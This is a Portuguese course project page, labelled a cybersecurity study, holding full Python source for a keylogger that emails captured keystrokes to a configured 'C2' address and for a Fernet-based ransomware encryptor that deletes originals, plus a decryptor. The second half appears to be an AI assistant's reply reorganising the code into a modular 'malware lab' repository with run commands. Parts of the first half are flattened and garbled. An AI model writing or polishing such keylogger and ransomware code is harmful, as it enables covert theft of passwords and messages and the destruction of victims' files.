# Ransoware_Keylogger_Estudos
Esse estudo é um Projeto de nota Cyber Segurança Santander Dio
CONFIGURAÇÃO
==============================================================================
class Config: # E-mail EMAIL_FROM = "@*.com" EMAIL_TO = "@.com" # CORREÇÃO: Usar EMAIL_TO aqui EMAIL_PASSWORD = "*********" # Use App Password se tiver 2FA

Download
Copy code
# Servidor SMTP (ProtonMail)
SMTP_SERVER = "mail.******.com"
SMTP_PORT = 587

# Comportamento
FLUSH_INTERVAL = 30       # Segundos para forçar envio se houver dados
MAX_BUFFER_SIZE = 1024    # Caracteres antes de forçar envio imediato
LOG_FILE_LOCAL = "keylog_backup.log" # Backup local em caso de falha
LOG_LEVEL = logging.DEBUG # Nível de log do próprio keylogger (não do usuário)
==============================================================================
SETUP DE LOGGING INTERNO
==============================================================================
def setup_logger(): log_dir = "keylogger_debug" if not os.path.exists(log_dir): os.makedirs(log_dir)

Download
Copy code
log_file = os.path.join(log_dir, f"keylogger_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")

logging.basicConfig(
    level=Config.LOG_LEVEL,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
return logging.getLogger("KeyloggerPro")
logger = setup_logger()

==============================================================================
CLASSE DE TRANSPORTE (EMAIL)
==============================================================================
class EmailTransporter: def init(self, config: Config): self.config = config self.lock = Lock()

Download
Copy code
def _compress_data(self, data: str) -> str:
    """Comprime dados em Base64 para reduzir tamanho do email."""
    compressed = zlib.compress(data.encode('utf-8'))
    return base64.b64encode(compressed).decode('utf-8')

def _build_email(self, subject: str, body_b64: str) -> MIMEMultipart:
    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = self.config.EMAIL_FROM
    msg["To"] = self.config.EMAIL_TO  # AGORA ESTÁ CORRETO
    
    # Corpo em texto simples
    text_part = MIMEText(body_b64, 'plain', 'utf-8')
    msg.attach(text_part)
    return msg

def send(self, log_data: str) -> bool:
    """Envia o log de forma assíncrona e segura."""
    if not log_data or not log_data.strip():
        return True
        
    with self.lock:
        try:
            logger.info(f"Iniciando envio de {len(log_data)} caracteres...")
            body_b64 = self._compress_data(log_data)
            subject = f"[Keylogger] {platform.node()} - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            msg = self._build_email(subject, body_b64)
            
            server = smtplib.SMTP(self.config.SMTP_SERVER, self.config.SMTP_PORT, timeout=15)
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(self.config.EMAIL_FROM, self.config.EMAIL_PASSWORD)
            server.sendmail(self.config.EMAIL_FROM, self.config.EMAIL_TO, msg.as_string())
            server.quit()
            
            logger.info("Envio concluído com sucesso.")
            return True
        except smtplib.SMTPAuthenticationError as e:
            logger.error(f"Erro de Autenticação SMTP: {e}")
            return False
        except smtplib.SMTPConnectError as e:
            logger.error(f"Erro de Conexão SMTP: {e}")
            return False
        except Exception as e:
            logger.exception(f"Erro desconhecido no envio: {e}")
            return False
==============================================================================
CLASSE DE CAPTURA (KEYLOGGER)
==============================================================================
class KeyCaptureEngine: def init(self, config: Config, transporter: EmailTransporter): self.config = config self.transporter = transporter self.buffer = "" self.active_process = "Unknown" self.lock = Lock()

Download
Copy code
    # Lista de teclas a ignorar (modificadores puros)
    self.IGNORE_KEYS = {
        keyboard.Key.shift,
        keyboard.Key.shift_r,
        keyboard.Key.ctrl_l,
        keyboard.Key.ctrl_r,
        keyboard.Key.alt_l,
        keyboard.Key.alt_r,
        keyboard.Key.caps_lock,
        keyboard.Key.cmd,
        keyboard.Key.cmd_r,
        keyboard.Key.num_lock,
        keyboard.Key.scroll_lock
    }
    
    self._last_flush = time.time()
    self._start_flush_timer()
    
def _get_active_process(self) -> str:
    """Obtém o nome do processo ativo (Windows)."""
    if platform.system() == "Windows":
        try:
            import ctypes
            import ctypes.wintypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            pid = ctypes.wintypes.DWORD()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            h_process = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid.value)
            exe_name = ctypes.create_string_buffer(260)
            ctypes.windll.psapi.GetModuleBaseNameA(h_process, 0, exe_name, ctypes.wintypes.DWORD(260))
            return exe_name.value.decode('utf-8')
        except Exception as e:
            logger.debug(f"Erro ao obter processo ativo: {e}")
            return "Unknown"
    else:
        return "System"
        
def _flush_buffer(self):
    """Envia o buffer se houver conteúdo suficiente."""
    with self.lock:
        current_time = time.time()
        if len(self.buffer) >= self.config.MAX_BUFFER_SIZE or (self.buffer and (current_time - self._last_flush) > self.config.FLUSH_INTERVAL):
            data_to_send = self.buffer
            self.buffer = ""
            self._last_flush = current_time
            
            logger.debug(f"Flush de {len(data_to_send)} caracteres agendado.")
            Thread(target=self._safe_send, args=(data_to_send,), daemon=True).start()
            
def _safe_send(self, data: str):
    """Tentativa de envio com fallback local."""
    success = self.transporter.send(data)
    if not success:
        logger.warning("Falha no envio por email. Salvando backup local.")
        try:
            with open(self.config.LOG_FILE_LOCAL, "a", encoding="utf-8") as f:
                f.write(f"--- CHUNK {datetime.now().isoformat()} ---\n")
                f.write(data)
                f.write("\n")
        except Exception as e:
            logger.error(f"Falha ao salvar backup local: {e}")
            
def _start_flush_timer(self):
    """Agenda o flush periódico."""
    Timer(self.config.FLUSH_INTERVAL, self._start_flush_timer).start()
    
def on_press(self, key):
    """Handler para teclas pressionadas."""
    self.active_process = self._get_active_process()
    
    try:
        if key.char:
            with self.lock:
                self.buffer += key.char
                if len(self.buffer) >= self.config.MAX_BUFFER_SIZE:
                    self._flush_buffer()
                    
    except AttributeError:
        if key in self.IGNORE_KEYS:
            pass
        elif key == keyboard.Key.space:
            with self.lock:
                self.buffer += " "
        elif key == keyboard.Key.enter:
            with self.lock:
                self.buffer += f"\n[{self.active_process}]\n"
        elif key == keyboard.Key.tab:
            with self.lock:
                self.buffer += "\t"
        elif key == keyboard.Key.backspace:
            with self.lock:
                self.buffer += "[<]"
        elif key == keyboard.Key.esc:
            with self.lock:
                self.buffer += " [ESC] "
        else:
            nome = getattr(key, 'name', str(key))
            with self.lock:
                self.buffer += f"[{nome.upper()}] "
                
    if len(self.buffer) >= self.config.MAX_BUFFER_SIZE:
        self._flush_buffer()
        
def start(self):
    """Inicia o listener."""
    logger.info(f"Keylogger iniciado. Processo ativo: {self.active_process}")
    with keyboard.Listener(on_press=self.on_press) as listener:
        listener.join()
        
def stop(self):
    """Força o envio do buffer restante."""
    logger.info("Forçando flush final...")
    self._flush_buffer()
    time.sleep(1)
==============================================================================
EXECUÇÃO PRINCIPAL
==============================================================================
def main(): if sys.stdout is None: pass

Download
Copy code
config = Config()
transporter = EmailTransporter(config)
engine = KeyCaptureEngine(config, transporter)

logger.info("="*30)
logger.info(" KEYLOGGER PRO INICIADO ")
logger.info("="*30)

try:
    engine.start()
except KeyboardInterrupt:
    logger.info("Interrompido pelo usuário. Finalizando...")
    engine.stop()
except Exception as e:
    logger.critical(f"Erro crítico não tratado: {e}", exc_info=True)
    engine.stop()
if name == "main": main() from cryptography.fernet import Fernet import os

def carregar_chave(): # Usar 'with' para garantir que o arquivo seja fechado corretamente with open("chave.key", "rb") as chave_file: return chave_file.read()

def descriptografar_arquivo(arquivo, chave): f = Fernet(chave) try: with open(arquivo, "rb") as file: dados = file.read() dados_descriptografados = f.decrypt(dados) with open(arquivo, "wb") as file: file.write(dados_descriptografados) return True except Exception as e: print(f"Falha ao descriptografar {arquivo}: {e}") return False

def encontrar_arquivos(diretorio): lista = [] for raiz, _, arquivos in os.walk(diretorio): for nome in arquivos: caminho = os.path.join(raiz, nome) # Filtrar arquivos que não são a chave e não foram criados pelo ransomware if nome != "ransomware.py" and not nome.endswith(".key") and not nome.endswith("LEIA ISSO.txt"): lista.append(caminho) return lista

def main(): chave = carregar_chave() arquivos = encontrar_arquivos("test_files")

Download
Copy code
if not arquivos:
    print("Nenhum arquivo encontrado para descriptografar.")
    return

for arquivo in arquivos:
    if descriptografar_arquivo(arquivo, chave):
        print(f"Arquivo descriptografado com sucesso: {arquivo}")
    else:
        print(f"Erro ao processar: {arquivo}")

print("Processo de restauração concluído.")
if name == "main": main()

Copy message
Aqui está uma estrutura de projeto profissional e bem organizada para o seu repositório no GitHub, combinando os códigos fornecidos em um layout modular e documentado.

Estrutura de Pastas Sugerida
text
Download
Copy code
kindo-malware-lab/
├── README.md
├── requirements.txt
├── .gitignore
├── config/
│   └── settings.json          # Configurações externas (opcional, mas recomendado)
├── keylogger/
│   ├── __init__.py
│   ├── engine.py              # Lógica principal de captura (KeyCaptureEngine)
│   ├── transport.py           # Lógica de envio via Email (EmailTransporter)
│   ├── utils.py               # Funções auxiliares (logging, processo ativo)
│   └── main.py                # Ponto de entrada
├── ransomware/
│   ├── __init__.py
│   ├── encryptor.py           # Lógica de criptografia (Fernet)
│   ├── decryptor.py           # Lógica de decodificação/restauração
│   ├── target_selector.py     # Seleção de arquivos/diretórios
│   └── main.py                # Ponto de entrada
├── tests/
│   ├── test_keylogger.py
│   └── test_ransomware.py
└── docs/
    └── architecture.md
1. README.md
markdown
Download
Copy code
# Kindo Malware Lab: Keylogger & Ransomware Suite

Um projeto educacional avançado que demonstra técnicas de engenharia de malware usando Python. Este repositório contém uma implementação modular de um **Keylogger** com exfiltração via email e um **Ransomware** com criptografia simétrica (Fernet) e ferramentas de recuperação.

## 🛠️ Tecnologias
- **Python 3.10+**
- **pynput**: Captura de eventos de teclado.
- **cryptography**: Criptografia Fernet (AES-128-CBC + HMAC-SHA256).
- **smtplib**: Exfiltração de dados via SMTP.
- **ctypes**: Integração com APIs do Windows para metadados de processo.

## 📂 Estrutura do Projeto
| Módulo | Descrição |
| :--- | :--- |
| `keylogger/` | Motor de captura, bufferização e transporte de dados. |
| `ransomware/` | Lógica de criptografia, seleção de alvos e decodificação. |
| `tests/` | Testes unitários para validação de criptografia e captura. |

## 🚀 Instalação

```bash
git clone https://github.com/seu-usuario/kindo-malware-lab.git
cd kindo-malware-lab
python -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate
pip install -r requirements.txt
🐛 Executando o Keylogger
Configure as credenciais SMTP em keylogger/config.py ou via variáveis de ambiente.
Execute o motor:
bash
Download
Copy code
python -m keylogger.main
O log será salvo em keylog_backup.log em caso de falha de rede ou enviado para o C2 (email) configurado.

💾 Executando o Ransomware (Simulação)
Criptografia:
bash
Download
Copy code
python -m ransomware.main --mode encrypt --target ./test_files --key ./chave.key
Recuperação (Decryptor):
bash
Download
Copy code
python -m ransomware.decryptor --target ./test_files --key ./chave.key
🔐 Segurança e Melhores Práticas
Chaves Gerenciáveis: O projeto utiliza cryptography.fernet para gerar chaves seguras. Nunca commite arquivos .key no Git.
Isolamento: Execute em uma VM para evitar danos ao sistema host durante testes de criptografia em massa.
Logging: O keylogger possui logging interno (keylogger_debug/) para depuração sem contaminar o log do usuário.
📄 Licença
MIT

Download
Copy code

---

### 2. `requirements.txt`

```text
pynput>=1.7.6
cryptography>=42.0.0
3. Código Modularizado
Aqui está como organizar o código enviado em arquivos Python limpos e profissionais.

keylogger/transport.py
python
Download
Copy code
import base64
import zlib
import smtplib
import logging
import platform
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Lock
from datetime import datetime

class EmailTransporter:
    def __init__(self, config: dict):
        self.config = config
        self.lock = Lock()
        
    def _compress_data(self, data: str) -> str:
        """Comprime dados em Base64 para reduzir tamanho do email."""
        compressed = zlib.compress(data.encode('utf-8'))
        return base64.b64encode(compressed).decode('utf-8')
    
    def _build_email(self, subject: str, body_b64: str) -> MIMEMultipart:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = subject
        msg["From"] = self.config.get('EMAIL_FROM')
        msg["To"] = self.config.get('EMAIL_TO')
        text_part = MIMEText(body_b64, 'plain', 'utf-8')
        msg.attach(text_part)
        return msg
    
    def send(self, log_data: str) -> bool:
        """Envia o log de forma assíncrona e segura."""
        if not log_data or not log_data.strip():
            return True
            
        with self.lock:
            try:
                logger = logging.getLogger("KeyloggerPro")
                logger.info(f"Iniciando envio de {len(log_data)} caracteres...")
                body_b64 = self._compress_data(log_data)
                subject = f"[Keylogger] {platform.node()} - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                msg = self._build_email(subject, body_b64)
                
                server = smtplib.SMTP(self.config.get('SMTP_SERVER'), self.config.get('SMTP_PORT'), timeout=15)
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(self.config.get('EMAIL_FROM'), self.config.get('EMAIL_PASSWORD'))
                server.sendmail(self.config.get('EMAIL_FROM'), self.config.get('EMAIL_TO'), msg.as_string())
                server.quit()
                
                logger.info("Envio concluído com sucesso.")
                return True
            except smtplib.SMTPException as e:
                logger.error(f"Erro SMTP: {e}")
                return False
            except Exception as e:
                logger.exception(f"Erro desconhecido no envio: {e}")
                return False
keylogger/engine.py
python
Download
Copy code
import os
import time
import logging
from threading import Thread, Timer, Lock
from pynput import keyboard
from datetime import datetime
from .transport import EmailTransporter

class Config:
    EMAIL_FROM = "attacker@domain.com"
    EMAIL_TO = "c2@domain.com"
    EMAIL_PASSWORD = "app-password"
    SMTP_SERVER = "mail.domain.com"
    SMTP_PORT = 587
    FLUSH_INTERVAL = 30
    MAX_BUFFER_SIZE = 1024
    LOG_FILE_LOCAL = "keylog_backup.log"

class KeyCaptureEngine:
    def __init__(self, config: Config, transporter: EmailTransporter):
        self.config = config
        self.transporter = transporter
        self.buffer = ""
        self.active_process = "Unknown"
        self.lock = Lock()
        self.IGNORE_KEYS = {
            keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l,
            keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r,
            keyboard.Key.caps_lock, keyboard.Key.cmd, keyboard.Key.cmd_r,
            keyboard.Key.num_lock, keyboard.Key.scroll_lock
        }
        self._last_flush = time.time()
        self._start_flush_timer()
        
    def _get_active_process(self) -> str:
        if os.name == 'nt':
            try:
                import ctypes
                import ctypes.wintypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                pid = ctypes.wintypes.DWORD()
                ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                h_process = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid.value)
                exe_name = ctypes.create_string_buffer(260)
                ctypes.windll.psapi.GetModuleBaseNameA(h_process, 0, exe_name, ctypes.wintypes.DWORD(260))
                return exe_name.value.decode('utf-8')
            except Exception:
                return "Unknown"
        return "System"
            
    def _flush_buffer(self):
        with self.lock:
            current_time = time.time()
            if len(self.buffer) >= self.config.MAX_BUFFER_SIZE or (self.buffer and (current_time - self._last_flush) > self.config.FLUSH_INTERVAL):
                data_to_send = self.buffer
                self.buffer = ""
                self._last_flush = current_time
                Thread(target=self._safe_send, args=(data_to_send,), daemon=True).start()
                
    def _safe_send(self, data: str):
        success = self.transporter.send(data)
        if not success:
            try:
                with open(self.config.LOG_FILE_LOCAL, "a", encoding="utf-8") as f:
                    f.write(f"--- CHUNK {datetime.now().isoformat()} ---\n")
                    f.write(data)
                    f.write("\n")
            except Exception as e:
                logging.error(f"Falha ao salvar backup local: {e}")
                
    def _start_flush_timer(self):
        Timer(self.config.FLUSH_INTERVAL, self._start_flush_timer).start()
        
    def on_press(self, key):
        self.active_process = self._get_active_process()
        try:
            if key.char:
                with self.lock:
                    self.buffer += key.char
                    if len(self.buffer) >= self.config.MAX_BUFFER_SIZE:
                        self._flush_buffer()
        except AttributeError:
            if key in self.IGNORE_KEYS:
                pass
            elif key == keyboard.Key.space:
                with self.lock: self.buffer += " "
            elif key == keyboard.Key.enter:
                with self.lock: self.buffer += f"\n[{self.active_process}]\n"
            elif key == keyboard.Key.tab:
                with self.lock: self.buffer += "\t"
            elif key == keyboard.Key.backspace:
                with self.lock: self.buffer += "[<]"
            elif key == keyboard.Key.esc:
                with self.lock: self.buffer += " [ESC] "
            else:
                nome = getattr(key, 'name', str(key))
                with self.lock: self.buffer += f"[{nome.upper()}] "
                
        if len(self.buffer) >= self.config.MAX_BUFFER_SIZE:
            self._flush_buffer()
            
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
            
    def stop(self):
        self._flush_buffer()
        time.sleep(1)
keylogger/main.py
python
Download
Copy code
import logging
import sys
import os
from datetime import datetime
from .engine import KeyCaptureEngine, Config
from .transport import EmailTransporter

def setup_logger():
    log_dir = "keylogger_debug"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, f"keylogger_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[logging.FileHandler(log_file), logging.StreamHandler(sys.stdout)]
    )

def main():
    setup_logger()
    config = Config()
    transporter = EmailTransporter(vars(config))
    engine = KeyCaptureEngine(config, transporter)
    
    logging.info("KEYLOGGER PRO INICIADO")
    try:
        engine.start()
    except KeyboardInterrupt:
        logging.info("Interrompido pelo usuário.")
        engine.stop()

if __name__ == "__main__":
    main()
ransomware/decryptor.py
python
Download
Copy code
import os
from cryptography.fernet import Fernet

def carregar_chave(caminho_chave: str) -> bytes:
    with open(caminho_chave, "rb") as f:
        return f.read()

def descriptografar_arquivo(arquivo: str, chave: bytes) -> bool:
    f = Fernet(chave)
    try:
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_descriptografados = f.decrypt(dados)
        with open(arquivo, "wb") as file:
            file.write(dados_descriptografados)
        return True
    except Exception as e:
        print(f"Falha ao descriptografar {arquivo}: {e}")
        return False

def encontrar_arquivos(diretorio: str) -> list:
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if not nome.endswith(".key") and not nome.endswith("LEIA ISSO.txt"):
                lista.append(caminho)
    return lista

def main(target_dir: str, key_path: str):
    chave = carregar_chave(key_path)
    arquivos = encontrar_arquivos(target_dir)
    
    if not arquivos:
        print("Nenhum arquivo encontrado.")
        return

    for arquivo in arquivos:
        if descriptografar_arquivo(arquivo, chave):
            print(f"OK: {arquivo}")
        else:
            print(f"ERRO: {arquivo}")
ransomware/main.py
python
Download
Copy code
import os
import argparse
from cryptography.fernet import Fernet
from .decryptor import encontrar_arquivos

def gerar_chave(caminho: str):
    key = Fernet.generate_key()
    with open(caminho, "wb") as f:
        f.write(key)
    return key

def criptografar_arquivo(arquivo: str, chave: bytes, extensao: str = ".locked") -> bool:
    f = Fernet(chave)
    try:
        with open(arquivo, "rb") as file:
            dados = file.read()
        dados_criptografados = f.encrypt(dados)
        novo_nome = arquivo + extensao
        with open(novo_nome, "wb") as file:
            file.write(dados_criptografados)
        os.remove(arquivo)
        return True
    except Exception as e:
        print(f"Falha ao criptografar {arquivo}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Kindo Ransomware Simulator")
    parser.add_argument("--mode", choices=["encrypt", "decrypt", "gen-key"], default="gen-key")
    parser.add_argument("--target", default="./test_files")
    parser.add_argument("--key", default="./chave.key")
    
    args = parser.parse_args()
    
    if args.mode == "gen-key":
        key = gerar_chave(args.key)
        print(f"Chave gerada em {args.key}")
        
    elif args.mode == "encrypt":
        if not os.path.exists(args.key):
            gerar_chave(args.key)
        with open(args.key, "rb") as f:
            chave = f.read()
        for arquivo in encontrar_arquivos(args.target):
            criptografar_arquivo(arquivo, chave)
        print("Criptografia concluída.")
        
    elif args.mode == "decrypt":
        # Importa a lógica do decryptor para evitar duplicidade
        from .decryptor import descriptografar_arquivo
        with open(args.key, "rb") as f:
            chave = f.read()
        for arquivo in encontrar_arquivos(args.target):
            descriptografar_arquivo(arquivo, chave)
        print("Decodificação concluída.")
Diferenciais para o GitHub
Documentação: O README.md explica claramente a arquitetura.
Modularidade: Separação clara entre transporte, captura e criptografia.
Testabilidade: A estrutura permite que você adicione testes unitários facilmente (ex: testar se a criptografia gera o mesmo hash ao decodificar).
Segurança: Uso de Fernet (padrão da indústria para dados sensíveis) em vez de criptografia ad-hoc.
